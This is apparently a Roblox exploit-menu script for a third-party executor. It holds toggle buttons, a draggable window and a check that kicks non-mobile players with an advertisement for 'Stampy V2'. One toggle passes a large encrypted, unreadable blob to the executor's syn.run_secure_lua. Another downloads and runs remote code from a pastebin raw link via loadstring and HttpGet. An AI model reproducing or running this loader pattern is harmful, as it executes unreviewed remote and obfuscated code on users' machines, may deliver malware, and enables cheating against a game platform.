local function XFKKBE_fake_script() -- Toggle_11.Script 
	local script = Instance.new('LocalScript', Toggle_11)

	local toggled = false -- The start state of the toggle
	local debounce = false -- Debounce / cooldown so you cant spam the toggle and break it
	
	script.Parent.Button.MouseButton1Click:Connect(function() -- Gets executed when you click the button
		if debounce == false then
			if toggled == true then -- If the toggle is already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(31, 31, 31)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 4,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = false
			elseif toggled == false then -- If the toggle isnt already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(94, 105, 255)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 18,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = true
				syn.run_secure_lua("OXbUTZZnKA5ZY1mgnRKzQSMVb/DjEe9EFrsxp6vHfpKyzGfiaWxliCDDO017FSqOSf3xydGiPcVjRxzBkIW62l8AYtSZblG8OQPA1z201BpuZF5rsArUMWHMXTyNkVXsOiTUcepuSjvqP/EJTL0iJ5JIlQyRuZhEJVSBfqmPeMdaz1IWZP7qoZO790hkO/st2qRNF9E2zKYKO6JWxG8XVR88/c18YCv80i3j77mVxT+Xvfqh7Ow9O9TyMyVSAYpDwpq92Cui232ukAw4eV8dYBxRzucCebAYRhBu7s4uG71VYKORfCBqqOOi3iUQMTt9p5MtdwuRJIvt+44+M3wB6jBohpbO8K7LmIZECdkmUzuPKSBlSYofHkH/GlYOw1R+tO1Vg0G+vTjN2qVvFNmLfGapQNiMLx+LJOm34KiPmT+Vi85MwbYyyB/6sabRrTDS8So90g8QCoPmQcectG/GKhZ7P65yqyx1RefKR9VsYgRUaZkeHHzK8BAEjQGp+xJmQphHWj2rIFojoSdLr31J/zpDZQ3SJtkvI7FZyRUsDFUdLwUCvcrD9Qcm3TpVxl1/ZrkEX8yG8aX1FYj9gwDZSEQdet+MASAGNR8PZooQc47u/CEdIH7A/4sim/MRnYl8KDAtmDpI2HD5bDuv6ix84BZ/2hIZaeYE2Q//5JOf1qhDarSf9E5HaPLfoR48l26JP71th2leN4DcxbyHqPJwlwKfktXs7fzY5ihbFUAsM0OGDcAgvlYgl+Oo0x7P+2jBTye2q0wSzlVrOTRT2cGkX5PbP4YiX6TuKSxUJJ8c5DMAjGYg3ijkDEOEf0za9LVGg5w222za1+qHtMwttNV+kvgvhwKgFA+/zijZaeFzRo9bfikvAe3d2W89q0xt61jCdZzA++YIXGKC6oxPJj+9kkjA96nOIgcXQVuCKAjmpmxUKBpk2Tuh0s1WBTzVxkYDxT1wrxLvkRMz+Yz8DZihdRVZf0TLN2/g/4005r51wjYypn+9q1wYNTRMWT5WjoExBt+bhc+nM6MnHFFUq2gMRUO9tRD3x3raLmVxvQUyzJCN9r5ZO/KN3POwL1jrdpA8zMAR+EOjZdIKNj9tuNhkCZXo3qyTMvVoot1vbWlKE4m2qbhmChtTdjEC9tK/Ri0sblna6mWY29QAyvD5HPPXE0ABWW4O6wx7RAn9CRtI+blt/Nn7KULd/JAecNUPrPs2znm7B+oEjsQYZBjGtRooPuD8TUPd7M9coJLKELdQyTmrgFG2G9/3a/myFJv/38DZrf90tEsqLS3MU0WA932sG35GEIMoWX0EXcPTdIh1giJ/BGmczWQW/xq8SiR6y85EK6w3z/7KpO2kvXLOwxlxfLnwSy5X7jltW5HPED6nYDtdjkqJ9EQoLdPon+LMPpkaxa8c/4BkuQJsAxSoY7N5sKsC/Ac8JPE5K+zHPLR4fNiJK6D3o/5YVFxK9i8jdcAPZQYvRZvcPCGTuScYd70yKQ07eqgMhaCQq/OKDKLmt1CJnIM/AsaTQJFgGKTURDQK3d/nXHPpx953L3oPZc1L5DGmBmJqvJqN0bbv0HqLcwgomoIOZTQq8jNTeUSdtJ+70/DTwOm2wvsvuxJ0qtzOjPg7+kckt8ZEPl4GFXY+BHqOg4VN5e9XsesJZLvWlV//Sv1Fl0m7ji+0p2z48/A66ZNnJJfKZQJOs0ajLg5XTk/9NHHXUBnGBV94FmQl5GGyv1myd1XhtfK7YZ5PMobEnL8hjy0nDs0ptmNNkxs/Ly/CtzPlfcj0UVz+/LkQGrfwoBosd53jOBSqdicCW0m0OITdaWzAA+Tj6rN8HOtAMwZmv0DaO7zcErW6u0aACmclVzKH4W3eqf78UTjnYXCDPrHKBgurLcCOKY6ouec6/zRuKs3Wtaq8L2PMulPmz2U1qfYFcZjnZrA1k6b2DAUBJsqyVuPQZPRQg9oVPLCKTLVA+Zl4WA6SYpB2O+wmmIk+Rpk1EEraD82mLAMSJvqRnWaxKcKfsMR/rfKC4n0dITzVuLZPax3hbpvkYSNVcUp3oQnh/krOjY4NwjYKAReQAqhakof/32qdbEkAcTcX4yU0XJI3s6yYNuR468a9XMfgqUsm9WB/uFOzdHo8FWxk9qwtEAf+SDvFkuA7d8bRobxEGI0bu8rEE2DHZNNJGrZtplAl99fRozrn9K1NxDuLQCtzReqHOjTVFsecisW8U2iPIbRzTIduso6p2Lm3/I3rlyr+WXZQ8aBD4ofCqb01naVs8aqaXeaVDs14rLhSbQfJRrkifzwZqPF25HIuDvZDkfiIporWV1erT9ocESiKxLkieqAd++AIzmSHUOSBxPPKa5PQjxiG/fDUsmlLc4F4CHFIJMXZC9CNTCXrv5Rl7r5r5pODUiAYyCIplXPmhp6jVsHpcplKCfreS6X/EgL5o3/hYs4N32ABrX6C+pNd4/D8AOIzMwr0V5Plu4Ky2CxnDIKLUzI5zjEb7e91ZynLG6SS4vaP43qCJAXAMUgcfUQpyWunnUwH3lHDimzq/mVUFpb4Dq1vvNoDPo72TyUO/j2uswWCDwP5dY2wgC6L1vNaF7CCp6HsXZIbt/yzNG/o1IP7aRKjAkVYVyq3e9ooENIITwmkCJVS0/dnRflmfSrd+yJp+HNpizQZfpEGyz135m3Nw0zNELJXL8RS+cYqkDQaYL6ilEH5jI0bQmB3z+kLEq8AXmQdOgZWj4wLsmLbH/+ch0d6uvZSTkogzvx57YFqgXH8SJrWVPBDVhvGm1p6KYXmf+3CV0psfxmTaEuwu2Gt/lVBRga+oNKD43tx+nXnPYQGq+F44g+GXJJBg3zDXMulZx7PS3uwuWPctspzAeb1Ww8lV84t1b8DFnfAXeemzQundf26OkEdvWo4PFktTlkpBwM6g1zl4W12ACJfwmYFJs46E8T9maUV9sRNAiPgZSQRt43SmoGF/8SH8f/aXB3s8kqMlSt2S3jMM1pm6K65NBGJ03Xq1gp3X9Tz")
	end
			end
		
		end)
end
coroutine.wrap(XFKKBE_fake_script)()
local function UBGYMSK_fake_script() -- Toggle_12.Script 
	local script = Instance.new('LocalScript', Toggle_12)

	local toggled = false -- The start state of the toggle
	local debounce = false -- Debounce / cooldown so you cant spam the toggle and break it
	
	script.Parent.Button.MouseButton1Click:Connect(function() -- Gets executed when you click the button
		if debounce == false then
			if toggled == true then -- If the toggle is already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(31, 31, 31)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 4,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = false
			elseif toggled == false then -- If the toggle isnt already on
				debounce = true
				loadstring(game:HttpGet("https://pastebin.com/raw/A7Qtx7D3", true))()
	end
			end
		
		end)
end
coroutine.wrap(UBGYMSK_fake_script)()
local function BIUWK_fake_script() -- Script.LocalScript 
	local script = Instance.new('LocalScript', Script)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), 'Out', 'Linear', 0.06, true); -- drag speed
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
coroutine.wrap(BIUWK_fake_script)()
local function LKMZ_fake_script() -- Script.LocalScript 
	local script = Instance.new('LocalScript', Script)

	local UserInputService = game:GetService("UserInputService")
	local plr = game.Players.LocalPlayer
	
	if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled then
		print("Mobile device")
	else
		plr:Kick("Not Mobile Bozo Buy Stampy V2 Win10")
	end
end
coroutine.wrap(LKMZ_fake_script)()
